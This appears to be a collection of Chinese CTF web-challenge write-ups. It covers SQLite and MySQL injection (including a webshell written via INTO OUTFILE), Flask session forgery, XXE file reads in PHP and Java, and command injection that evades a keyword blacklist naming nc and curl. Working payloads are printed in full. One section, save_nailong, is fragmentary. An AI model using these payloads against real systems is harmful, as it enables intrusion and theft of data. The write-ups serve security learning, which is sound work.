    [BCACTF 2024] Michaelsoft Gring — 空格被过滤，就用 Tab

    题目类型：SQLite 联合查询注入 — 空格绕过

    Flag：bcactf{59L_1n1ECTeD_026821}

    题目概述

    题目直接告诉你是 sqlite。这省掉了一大半判断成本——不用再去猜 information_schema 还是 sqlite_master。

    解题过程

    Step 1：确认注入点

    搜索框输入单引号 '，报错。注入点确认。

    Step 2：空格被过滤了

    正常 payload 里的空格全被吃掉，SQL 拼不起来。

    常见的替代方案有三种，但这里只有一种能用：

    替代写法 能不能用 原因
    /**/（注释当空格） ❌ / 在 URL 里会被当成路径分隔符，服务器直接致命错误
    %20 ❌ 就是空格本体，一样被过滤
    %09（Tab） ✅ Tab 在 SQL 里和空格等价，且不在过滤名单里

    所以后面所有 payload 里的空格都写成 %09。

    Step 3：确定列数

    1' UNION SELECT 1--

    URL 编码后：

    1'%09UNION%09SELECT%091--

    只有一列。（多给几列会报错“SELECT 列数不一致”）

    Step 4：爆表（SQLite 的关键点）

    SQLite 没有 information_schema，表结构存在 sqlite_master 里：

    1' UNION SELECT group_concat(name) FROM sqlite_master--

    1'%09UNION%09SELECT%09group_concat(name)%09FROM%09sqlite_master--

    返回：search,flag

    两张表：search 是正常业务表，flag 是目标。

    Step 5：拿 flag——两种做法

    ① 直接查那一列

    1' UNION SELECT group_concat(flag) FROM flag--

    ② 更省事：查建表语句，一次看到表名+列名

    1' UNION SELECT group_concat(sql) FROM sqlite_master--

    返回类似：

    CREATE TABLE flag(flag TEXT)

    看到 flag(flag)，就知道表名和列名都是 flag——一条语句搞定“爆表 + 爆列”。

    最终：

    bcactf{59L_1n1ECTeD_026821}
    关键点 说明
    数据库 题目直接说是 sqlite，省掉指纹判断
    注入点 单引号报错
    空格过滤 用 %09（Tab）替代；/**/ 不行，因为 / 在 URL 里是路径符
    列数 1 列
    表结构 SQLite 用 sqlite_master，字段有 type、name、sql
    一次的取全 group_concat(sql) 能直接拿到建表语句
    注释 -- 后面要跟空格（这里用 --%09 或直接 -- 结尾）
    SQLite 注入速查 
    -- 表清单
SELECT group_concat(name) FROM sqlite_master WHERE type='table'

-- 建表语句（表名+列名一次看全）
SELECT group_concat(sql) FROM sqlite_master

-- 拿数据
SELECT group_concat(flag) FROM flag

    SQLite 没有的东西： 

    information_schema    ✗
load_file()           ✗
INTO OUTFILE          ✗（默认）
    所以 sqlite 题基本是“把库读干净”，不是 getshell。

    这题踩的坑

    ① 用 /**/ 代替空格

    URL 里的 / 会被服务器当路径处理，直接致命错误，请求还没到 SQL 就挂了。这种情况下只能用 %09 或 %0a。

    ② 想查 information_schema

    SQLite 里根本没有这张表。表结构在 sqlite_master。

    ③ 只爆表不爆列

    group_concat(sql) 一条就能同时拿到表名和列名，比先爆表再爆列少两步。

    ④ payload 忘记以 1' 开头

    前面的 1' 是用来闭合原查询的引号的，单写 UNION SELECT 拼进去是语法错误。

    [NSSRound#13 Basic] flask?jwt? — 先分清它是谁

    题目类型：Flask session 伪造（签名密钥泄露）

    Flag：NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}

    题目概述

    题名本身就是提示：flask?jwt?——它在问你，这个 session 到底是 Flask 的还是 JWT 的。

    这两者长得像（都是一串点分段的 base64），但处理方式完全不同：

    JWT             三段，第一段是 {"alg":"HS256",...}
Flask session   三段或四段，解出来是 {"_fresh":true,...}

    先分辨清楚，再决定用哪套工具——这一步能省掉大量瞎试。

    解题过程

    Step 1：注册个账号，看 session

    随便注册、登录，抓包看 cookie：

    session=eyJfZnJlc2giOnRydWUs...

    它是三段式，而且解出来是 Python 字典的键名（_fresh、_user_id）——这是 Flask 的 session，不是 JWT。

    用 flask-unsign 解：

    flask-unsign --decode --cookie "<cookie>"

    {'_fresh': True,
 '_id': 'ae8e9db8fb729eeafed37232050214fccc9622e0659ecd9f43975a2a49ca9e26c0f81ca580bf3fe07a890e68021b5b54fffe0e2bc8cb86a30e503a402acbbd02',
 '_user_id': '2'}

    三个键：

    _fresh    这次是不是刚登录的
_id       会话 id（Flask-Login 用来绑定会话）
_user_id  当前用户编号 ← 要改的就是它

    Step 2：点“获取 flag”，提示不是 admin

    说明后端在判断 _user_id 是不是 1。

    那就把 '2' 改成 '1'。

    Step 3：直接改值没用——它是签名过的

    Flask 的 session 是签名 cookie：内容放在客户端，但签名在服务端校验。

    改了内容、签名对不上，服务端直接丢弃整个 session，表现得像“你没登录”。

    所以必须重新签名，而这需要 SECRET_KEY。

    Step 4：一边爆破，一边找提示

    flask-unsign --unsign --cookie "<cookie>" --wordlist E:\dsh\flask\rockyou.txt --no-literal-eval

    --no-literal-eval 是必须的：rockyou 里有纯数字行（比如 123456），默认会被当 Python 字面量解析成整数，然后报 Secret must be a string，爆破直接中断。

    注意这一步是并行的——爆破同时去翻页面。

    在“忘记密码”页面的 HTML 源码末尾，看到一行注释：

    <!-- secretkey: th3flaskisfunny -->

    密钥直接写在页面注释里。

    Ctrl + C 停掉爆破——不用等了。

    Step 5：用密钥重签

    flask-unsign --sign --cookie "{'_fresh':True,'_id':'ae8e9db8...503a402acbbd02','_user_id':'1'}" --secret "th3flaskisfunny"

    三个必须注意的：

    ① 整个字典都要写，不能只写 _user_id
   _fresh 和 _id 缺了，Flask-Login 认为会话不完整，直接不认
② 值保持字符串：'1' 而不是 1
③ PowerShell 里用双引号包整块，里面用单引号

    把输出的值替换 cookie，刷新页面再点一次“获取 flag”：

    NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}
    关键点 说明
    判断类型 解第一段：{"alg":...} 是 JWT，{"_fresh":...} 是 Flask
    Flask session 内容在客户端，签名在服务端，改值必须重签
    三个键 _fresh / _id / _user_id，重签时一个都不能少
    爆破参数 --no-literal-eval（否则数字行会中断爆破）
    密钥来源 页面 HTML 注释：<!-- secretkey: th3flaskisfunny -->
    提权动作 _user_id 从 2 改成 1
    完整流程 
    # ① 解码
flask-unsign --decode --cookie "<cookie>"

# ② 爆破（可被下面的源码提示中断）
flask-unsign --unsign --cookie "<cookie>" --wordlist E:\dsh\flask\rockyou.txt --no-literal-eval

# ③ 用泄露的密钥重签
flask-unsign --sign --cookie "{'_fresh':True,'_id':'ae8e...','_user_id':'1'}" --secret "th3flaskisfunny"
    这题踩的坑

    ① 把 Flask session 当 JWT 打

    jwt_tool 会直接报 Not 3 parts（四段）或解析出一堆 _fresh 之类的键。两个工具不通用，先判断再选。

    ② 在 rockyou 上干等

    1400 万行要跑很久。--no-literal-eval 不加还会直接崩。正确做法是同时翻页面——这题的密钥就在注释里。

    ③ 只写 _user_id 去签名

    Flask-Login 需要 _fresh 和 _id，缺一个就判会话无效。重签是“整块重写”，不是“打补丁”。

    ④ 写成 1 而不是 '1'

    类型不一致，比较可能失败。原来是什么类型就保持什么类型。

    [NCTF2019] Fake XML cookbook — 名字就是答案

    题目类型：XXE（XML 外部实体注入）

    Flag：CTF2{72a5521b-e903-46b6-a937-056b82c51205}

    题目概述

    题名里直接写着 XML。

    这种“名字就是考点”的题，先别急着找别的洞——就按它说的方向走。

    解题过程

    Step 1：确认请求体是 XML

    页面源码里翻到登录逻辑，提交方式很明确：

    var data = "<user><username>" + username + "</username><password>" + password + "</password></user>";
$.ajax({
  type: "post",
  url: "doLogin.php",
  contentType: "application/xml",
  data: data
})

    三件事对上了：

    请求体是 XML           ← 拼接出来的标签结构
Content-Type 是 xml    ← application/xml
数据直接拼进去          ← 没有转义

    XML + 可控输入 = 先试 XXE。

    Step 2：加声明和引用，验证漏洞

    抓包，把请求体改成：

    <!DOCTYPE user [ <!ENTITY x "12"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    返回里 msg 变成了 12——说明实体被解析了，DTD 是生效的。

    第一步验证完成：这里能定义实体，也就能定义外部实体。

    Step 3：先读源码，确认为什么登录没用

    响应头带着 PHP，所以可以用 PHP 的伪协议。

    但要注意一个前提：外部实体读的是“文件原文”，不会经过 PHP 解析。想读源码就必须先 base64 编码，否则 <?php ... ?> 会被当成 XML 标签吞掉。**

    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    把返回的 base64 解出来，就是 doLogin.php 的源码：

    $USERNAME = 'admin';
$PASSWORD = '024b87931a03f738fff6693ce0a78c88';
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try {
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $username = $creds->username;
    $password = $creds->password;

    if ($username == $USERNAME && $password == $PASSWORD) {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 1, $username);
    } else {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 0, $username);
    }
} catch (Exception $e) {
    $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 3, $e->getMessage());
}

    两个关键配置：

    libxml_disable_entity_loader(false);   // 允许加载外部实体
LIBXML_NOENT | LIBXML_DTDLOAD          // 替换实体 + 加载 DTD

    这就是漏洞的根源。

    Step 4：账号密码是假的线索

    源码里确实有账号和 md5 密码，但登进去没有任何东西——flag 不在数据库里，在文件系统上。

    所以这条路走完就丢掉，别在登录上耗时间。

    Step 5：直接读 flag

    把 resource= 换成 flag 文件即可：

    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    base64 解码：

    CTF2{72a5521b-e903-46b6-a937-056b82c51205}

    如果 flag 文件里都是纯文本、没有 <，也可以直接 SYSTEM "file:///flag"，省掉编码这一步。

    关键点 说明
    识别 题名 + Content-Type: application/xml + 拼接请求体
    验证 内部实体 <!ENTITY x "12"> 能生效，就说明 DTD 没关
    读源码 php://filter/read=convert.base64-encode/resource=xxx
    为什么编码 外部实体读的是原文，<?php 会破坏 XML 结构
    漏洞根源 libxml_disable_entity_loader(false) + LIBXML_NOENT
    登录没用 账号密码是真的，但 flag 不在库里
    完整 payload 
    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    POST /doLogin.php
Content-Type: application/xml
    这题踩的坑

    ① 只声明实体，不写 &x;

    实体是“登记”，引用才是“取值”。不引用，服务器根本不会去读文件。

    ② 用 file:// 读 PHP 源码

    读到的是原文，但 <?php 会被当成 XML 标签，解析直接炸。读源码必须走 php://filter + base64。

    ③ 拿账号密码去登录

    那是干扰项。flag 在文件里，不在数据库里。

    ④ 忘了 LIBXML_NOENT

    源码里 loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD) —— 少了 LIBXML_NOENT 实体不会被替换，你只能看到 &x; 本身。

    星辉魔女名鉴 — 库里没有 flag，那就写一个 shell 进去

    题目类型：SQL 注入 — INTO OUTFILE 写文件 getshell

    Flag：MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}

    题目概述

    页面底部有个“终端”入口，进去是一块维护控制台。提示是日语的，先翻译：

    $ archive --status
[ ok ] 名鑑検索サービス: alive
[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)

$ archive --storage
[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
[info] 検索サービス本体は名鑑フロントから未接続

    翻译过来关键的就一行：

    导出临时区域：/io/（写入需在 export 功能实现后）

    这句话等于提前告诉你：/io/ 目录可写。后面所有操作都是围着这一句展开的。**

    解题过程

    Step 1：找注入点

    页面有个筛选框，输入 rarity >= 3 会返回一段 JSON，里面把拼好的 SQL 也打出来了：

    SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity >= 3 ORDER BY id ASC

    输一个单引号（'），报错——注入点确认。

    Step 2：确定列数

    原查询是 6 个字段（id, name, title, rarity, element, sig），所以 UNION 也要 6 列：

    0 UNION SELECT 1,2,3,4,5,6

    能正常返回，说明列数对上了。

    Step 3：爆库表列

    6 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.TABLES-- -

    6 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='archive_notes'-- -

    -- - 是注释掉后面原来的 ORDER BY id ASC（注意 -- 后面必须有一个空格）。

    扫出来的表里，与题目相关的就两张：witches（正常数据）和 archive_notes（看起来像隐藏内容）。

    Step 4：库里的“flag”是假的

    读 archive_notes，看到这么一条：

    封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}

    注意它自己写着 d3c0y_..._d0_n0t_submit——这是诱饵，交上去就是错的。**

    这题的 flag 不在数据库里。

    Step 5：看看能不能写文件

    既然提示说 /io/ 可写，先确认数据库的写权限目录：

    6 UNION SELECT 1,@@secure_file_priv,3,4,5,6-- -

    返回：

    /var/www/html/io/

    @@secure_file_priv 就是 MySQL/MariaDB 允许 INTO OUTFILE 写入的目录——和终端里那行提示完全对上了。

    这说明出题人是故意把这条路留给你。

    Step 6：写一个 webshell

    rarity >= 6 UNION SELECT 1,'<?php system($_GET[0]);?>',3,4,5,6 INTO OUTFILE '/var/www/html/io/C.php'-- -

    几个必须注意的地方：

    ① 路径用 @@secure_file_priv 给的那个，不能写别处
② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
④ 所以用 $_GET[0] 这种不带引号的写法最保险

    访问：

    /io/C.php?0=cat%20/flag

    得到：

    MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
    关键点 说明
    注入点 筛选条件 rarity，单引号报错确认
    列数 原查询 6 列，UNION 也要 6 列
    注释 -- -（-- 后必须空格），用来吃掉 ORDER BY
    提示的价值 终端已告知 /io/ 可写
    写权限目录 @@secure_file_priv = /var/www/html/io/，与提示吻合
    写 shell INTO OUTFILE + $_GET[0]（避开引号转义）
    诱饵 archive_notes 里的 d3c0y_... 是假的，别交
    完整流程 
    -- ① 确认列数
0 UNION SELECT 1,2,3,4,5,6

-- ② 爆表
6 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.TABLES-- -

-- ③ 看写权限目录
6 UNION SELECT 1,@@secure_file_priv,3,4,5,6-- -

-- ④ 写 shell
rarity >= 6 UNION SELECT 1,'<?php system($_GET[0]);?>',3,4,5,6 INTO OUTFILE '/var/www/html/io/C.php'-- -

    访问：/io/C.php?0=cat /flag
    这题踩的坑

    ① INFORMATION_SCHAME 拼错

    是 INFORMATION_SCHEMA。拼错不会报注入失败，只会返回空——很容易误判成“表不存在”。

    ② 忘了 -- - 注释

    后面那句 ORDER BY id ASC 还在，UNION 的结果会被排序吞掉，看起来像“没插进去”。

    ③ 双引号被 MySQL 转义

    $_GET["cmd"] 写进文件会变成 $_GET[\"cmd\"]，PHP 直接语法错误。用 $_GET[0] 或 $_GET[cmd]。

    ④ 反复往同一个文件名写

    INTO OUTFILE 不允许覆盖已存在文件。写失败就换个名字（C.php → D.php）。

    ⑤ 交了诱饵 flag

    archive_notes 里那条自己写着 d0_n0t_submit。库里没有真 flag，必须有写文件这一步。

    blindgl4g — 黑名单拦了 cat，但拦不住 /bin/ca?

    题目类型：命令注入 — 通配符绕过关键词黑名单

    Flag：MYCTF{7c1f4b02-3e9a-4d57-8ab6-2f0c9e5d1a83}

    题目概述

    跟着提示摸到 get_gl4g.php，页面直接把过滤规则吐了出来：

    /\b(flag|cat|tac|head|tail|more|less|nl|od|xxd|hexdump|base64|strings|grep|awk|sed|cp|mv|rm|ln|find|xargs|ls|dir|tree|wget|curl|nc|ncat|netcat|telnet|socat|ssh|scp|bash|sh|zsh|dash|php|python3|python|perl|ruby|lua|env|export|declare|eval)\b|[`$(){}<>|&'"]|\\/i

    这条正则把能用的东西几乎都封了：

    关键词    flag、cat、ls、sh、bash、python、grep、base64……
符号      反引号、$、(、)、{、}、<、>、|、&、单双引号、反斜杠

    但仔细看，;、?、*、/、=、空格都没在名单里。

    这就是突破口。

    解题过程

    Step 1：先看哪些字符还能用

    字符 状态 用处
    ; ✅ 没拦 串联多条命令（这是整题的前提）
    ? ✅ 没拦 单字符通配符
    * ✅ 没拦 多字符通配符
    / ✅ 没拦 路径分隔
    $ ( ) 反引号 ❌ 拦了 不能用命令替换 $(...)
    引号 ❌ 拦了 不能写字符串
    \| & ❌ 拦了 不能用管道和后台

    注意 \b 是词边界——它匹配的是“完整的单词”，比如 cat 作为独立词出现才算。

    这也意味着：只要让 cat 不以“完整单词”的形式出现，就能绕过去。

    Step 2：命令名和文件名都得“变形”

    要执行的两样东西，都在黑名单里：

    命令 cat        → 被拦
参数 /flag      → 里含 flag，被拦

    所以思路是：两个都用通配符拼出来，让它们的字面形式里既没有 cat 也没有 flag。**

    Step 3：/bin/ca? 为什么能变成 /bin/cat

    shell 执行命令时走 PATH，cat 实际指向 /bin/cat。

    所以直接写绝对路径就够了：/bin/cat。

    但这串里含 cat（/bin/cat 结尾就是 cat），照样被 \b 拦。

    那就把最后一个字符换成通配符：

    /bin/ca?

    shell 在展开通配符时，会去 /bin 目录里找所有“ca 开头、后面一个字符”的文件。

    /bin 下以 ca 开头的只有 cat——所以 ? 精准匹配到它。

    而字符串 /bin/ca? 里没有 cat 这三个连续字符，正则匹配不到。

    Step 4：/fla? 匹配 /flag

    同理，参数里的 flag 也要拆：

    /fla?

    文件系统里以 fla 开头的目标文件就是 /flag，? 匹配那个 g。

    字符串里没有 flag 这个完整单词，\b 拦不住。

    Step 5：拼起来

    ;/bin/ca? /fla?

    ; 是命令分隔符——前面可以什么都没有（或者接在一个已有参数后面），后面接我们的命令。

    为什么需要 ;：注入点通常在一段已有的 shell 语句里，前面不加分隔符，你写的命令会被当成前一条命令的参数。**

    请求一次，回显里直接看到：

    [2026-11-20 07:02:14] ;/bin/ca? /fla?
MYCTF{7c1f4b02-3e9a-4d57-8ab6-2f0c9e5d1a83}

    顺便，;id 也能跑：

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

    说明命令确实执行了，不是回显注入。

    关键点 说明
    黑名单方式 关键词用 \b 词边界匹配，符号全部拉黑
    可用字符 ; ? * / = 空格
    ; 的作用 串联命令，把注入的命令和原语句分开
    通配符绕过 /bin/ca? → /bin/cat，字面量里不出现 cat
    参数绕过 /fla? → /flag
    为什么 ? 精准 /bin 下以 ca 开头的只有 cat；/ 下以 fla 开头的只有 flag
    还有其他可用姿势

    echo 不在黑名单里，可以直接列目录（不需要 ls）：

    ;echo /f*
;echo /bin/c*

    * 也会展开成路径，等于“用 echo 当 ls 用”。

    另外 ? 可以连续用：/fla?? 表示“fla + 两个字符”。

    这题踩的坑

    ① 只想着变形命令名，忘了参数也被拦

    cat 绕过了，但 /flag 里还有 flag，一样被 \b 拦住。两个都要变。

    ② 用 $(...) 或反引号

    这两个都被拉黑了。没有命令替换，只能靠通配符让 shell 自己展开。

    ③ 不加 ;

    注入点前面已经有命令了，不加分隔符，你的 /bin/ca? 会被当成上一条命令的参数传进去，什么都不会发生。

    ④ 以为 \b 是“包含”

    \b 是词边界。/bin/ca? 不含完整单词 cat，所以能过；如果黑名单写的是 strpos（子串匹配），这招就废了。判断过滤方式，决定了能不能用通配符。

    save_nailong — 六道门后面，钥匙写在 game.js 里

    题目类型：前端代码审计 — 全局函数 + 被 base64 藏起来的跳转参数

    题目概述

    剧情给了三句关键信息：

    解题过程

    Step 1：先正常玩一局，看有没有网络请求

    F12 打开网络面板打一局，结果很干净：

    只有 game.js
攻击的时候没有任何请求

    var SAVE_TAG = ['bjFsMG5n', 'X2IzYXNy', 'XzIwMjY='];

    三件事：

    ① SAVE_TAG 三段 base64，map(atob) 解码后 join 起来
② devGate() 拼成 nailong.php?pass=xxx 并跳转
③ window.devGate = devGate —— 这个函数被显式挂到了全局

    bjFsMG5n   →  n1l0ng
X2IzYXNy   →  _b3asr
XzIwMjY=   →  _2026

    海棠诗社·诗笺夹带 — 誊录官一字不改，那就把 flag 塞进诗里

    题目类型：XXE（XML 外部实体注入）— 绕过 file:// 过滤

    Flag：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}

    题目概述

    题目背景写得很讲究：

    诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
听新闻社中那面小旗，就压在誊录官的案头（/flag）。

    “笺上写什么就抄什么，一字不改”——这就是在告诉你：服务器会原样解析并回显你提交的 XML。

    而那面小旗（flag）就在它案头，也就是 /flag 文件。

    所以思路很清楚：让 XML 解析器自己去读 /flag，再把内容抄给我。

    解题过程

    Step 1：先看 JS，找到提交入口

    页面里有个输入框，但按钮背后才是关键。翻页面源码里的脚本：

    try {
  const r = await fetch('/tengchao', {
    method: 'POST',
    headers: {'Content-Type': 'application/xml'},
    body: document.getElementById('x').value
  })

    三件事一眼看清：

    接口      POST /tengchao
类型      application/xml
请求体    输入框 #x 里的全部内容，原样提交

    也就是说：输入框里写什么 XML，服务器就拿什么去解析。

    Step 2：先确认后端语言（这一步很重要）

    我第一反应是 PHP 环境，于是去试 php://filter。

    结果报错里的堆栈信息显示是Java。

    这一步的价值：

    报错暴露语言 → 决定用哪套绕过思路
PHP  的伪协议        php://filter、php://input
Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设

    很多时候“过滤能不能绕”不取决于过滤写得严不严，而取决于解析器是谁。

    Step 3：file:// 被过滤，但 Java 不认这个死理

    直接写 file:///flag，被拦了——代码里过滤了 file:// 这个字符串。

    但 Java 的 XML 解析器在解析 SYSTEM 后面的值时，是按 URI 处理的，对斜杠数量并不敏感：

    SYSTEM "file:///flag"    ← 被过滤
SYSTEM "file:/flag"      ← 只有一个斜杠，能过
SYSTEM "/flag"           ← 干脆不带协议，也能过（当作绝对路径）

    所以这里不是“绕过过滤技巧”，是“过滤器假设错了写法”。它以为外部实体只有 file:// 一种形态。

    Step 4：写 payload

    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE 诗筏 [ <!ENTITY x SYSTEM "file:/flag"> ]>
<诗筏>
  <题名>&x;</题名>
  <落款></落款>
  <句>出浴太真冰作影</句>
  <句>捧心西子玉为魂</句>
</诗筏>

    三部分缺一不可：

    ① <!DOCTYPE ... [ <!ENTITY x SYSTEM "file:/flag"> ]>
   在 DTD 里声明一个实体 x，内容来自 file:/flag

② <题名>&x;</题名>
   在正文里**引用**它 —— 不引用，解析器根本不会去读文件

③ 保留原有的结构
   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显

    最容易漏的是第 ②：只声明实体、不引用，服务器什么都不会给你。**

    Step 5：提交，读结果

    把整段 XML 填进输入框，点提交。

    “誊抄入册”那块原样回显了：

    题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
落款：
出浴太真冰作影
捧心西子玉为魂

    因为 &x; 在解析时被替换成了 /flag 文件的内容。

    关键点 说明
    入口 POST /tengchao，Content-Type: application/xml，body 完全可控
    判断语言 php://filter 报错 → 堆栈显示 Java
    Java 的宽松 SYSTEM 的值按 URI 解析，file:/、/flag 都能用
    过滤的误判 只过滤了 file:// 这个字符串，没想到还有别的写法
    XXE 三要素 声明实体 → 引用实体 → 保持原结构走到回显
    文件路径 /flag（题目描述里直接给了）
    完整 payload 
    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE 诗筏 [ <!ENTITY x SYSTEM "file:/flag"> ]>
<诗筏>
  <题名>&x;</题名>
  <落款></落款>
  <句>出浴太真冰作影</句>
  <句>捧心西子玉为魂</句>
</诗筏>
    这题踩的坑

    ① 只声明实体，不在正文引用

    <!ENTITY x SYSTEM "..."> 只是“登记”，解析器不会主动去读。必须在正文里写 &x; 才会触发读取和替换。

    ② 被 file:// 拦住就放弃

    过滤的是字符串，不是语义。file:/、file:、直接写绝对路径，都能达到同一个效果。

    ③ 没先判断后端语言

    PHP 的 php://filter 在 Java 里当然报错。报错本身就是信息——它告诉你该换哪一套思路。

    ④ 改了 XML 结构

    服务器的模板要求特定标签（<题名>、<句>），结构改坏就走不到回显那一步，哪怕实体读到了也没用。

    [CTF2] EZPHP — 条件永远为假，但错误处理器会说话

    题目类型：Web — PHP 代码审计，利用 set_error_handler 触发信息泄露

    Flag：CTF2{558d08e2-3e2c-43bc-be5b-6058c095641b}

    题目概述

    页面给了一段 PHP 源码（highlight_file(__FILE__) 把自身打印出来），底下永远显示 Try harder!。

    解题过程

    Step 1：先读代码

    <?php
highlight_file(__FILE__);
include "fl4g.php";
$dest0g3 = $_POST['ctf'];
$time    = date("H");
$timme   = date("d");
$timmme  = date("i");

if(($time > "24") or ($timme > "31") or ($timmme > "60")){
    echo $fl4g;
}else{
    echo "Try harder!";
}

set_error_handler(
    function() use(&$fl4g) {
        print $fl4g;
    }
);
$fl4g .= $dest0g3;
?>

    Step 2：第一个想法——绕开那个 if

    include 已经把 fl4g.php 引进来了，那直接让 if 成立不就能输出 $fl4g 了吗？

    看三个判断：

    date("H")   小时   00–23     永远不可能 > 24
date("d")   日期   01–31     永远不可能 > 31
date("i")   分钟   00–59     永远不可能 > 60

    三个都是“边界值本身等于上限”的情况，所以整条 or 永远是假。这条路封死。

    Step 3：真正的入口在下面

    set_error_handler(function() use(&$fl4g){ print $fl4g; });
$fl4g .= $dest0g3;

    set_error_handler 注册了一个自定义处理器——只要发生能被它捕获的错误，就会执行里面的 print $fl4g。

    而下一行就是触发器：$fl4g .= $dest0g3。

    Step 4：让拼接出错

    $dest0g3 来自 $_POST['ctf']，类型完全由我们决定。

    如果传一个字符串，拼接正常，什么都不会发生。

    如果传一个数组，PHP 试图把数组转成字符串来拼接，转不了——抛出 Warning: Array to string conversion。

    这个 warning 被刚刚注册的处理器捕获，于是 print $fl4g 执行，flag 就出来了。

    POST ctf[]=1
→ Array to string conversion
→ error handler
→ 打印 $fl4g

    解题思路总结

    读源码 → include 了 fl4g.php，但 if 永远为假（小时≤23、日≤31、分≤59）
       → 往下看，set_error_handler 注册了 print $fl4g
         → 找触发器：$fl4g .= $_POST['ctf']
           → 传数组 → 拼接失败 → warning → 处理器执行 → 拿到 flag

    漏洞原理

    ① 错误处理器会把“错误”变成“输出”

    set_error_handler 本来是用来记日志、兜异常的，但它注册的回调里做了什么，就是另一回事。这题的回调里是 print $fl4g——等于把“出错”这个事件接了一根线到“泄露变量”上。

    ② 数组与字符串拼接会抛 warning

    PHP 允许很多隐式类型转换，但数组转字符串不在其中。$str .= $array 不会静默失败，它会抛 Array to string conversion。

    这个 warning 默认是不致命的，页面照常返回——但 set_error_handler 能接住它。

    ③ 参数类型可控，是最容易被忽略的输入面

    $_POST['ctf'] 不一定是字符串。在表单里写成 ctf[]=1，PHP 就会把它解析成数组。很多开发者的防御只考虑了“值”，没考虑“类型”。

    关键知识点

    知识点 说明
    date("H") / "d" / "i" 小时 00–23、日 01–31、分 00–59，与判断边界相同，永远不可能大于
    set_error_handler 注册自定义错误处理函数，可捕获 warning/notice
    Array to string conversion 数组与字符串拼接时抛出的 warning，被处理器接住
    ctf[]=1 表单里这样写，后端 $_POST['ctf'] 就是数组
    use (&$fl4g) 引用捕获，让闭包能读到外部变量
    完整源码 
    <?php
highlight_file(__FILE__);
include "fl4g.php";
$dest0g3 = $_POST['ctf'];
$time    = date("H");
$timme   = date("d");
$timmme  = date("i");
if(($time > "24") or ($timme > "31") or ($timmme > "60")){
    echo $fl4g;
}else{
    echo "Try harder!";
}
set_error_handler(
    function() use(&$fl4g) {
        print $fl4g;
    }
);
$fl4g .= $dest0g3;
?>
    这题踩的坑

    ① 一开始死磕那个 if

    三个条件都卡在边界上（≤23、≤31、≤59），不是“运气不好没凑上”，是设计上就不可能。看到这种精度边界，就该立刻换路。

    ② 把 warning 当成“不影响”

    warning 确实不中断脚本，但这题的整个入口就在“warning 会被谁接住”上。错误级别不重要，谁在处理它才重要。
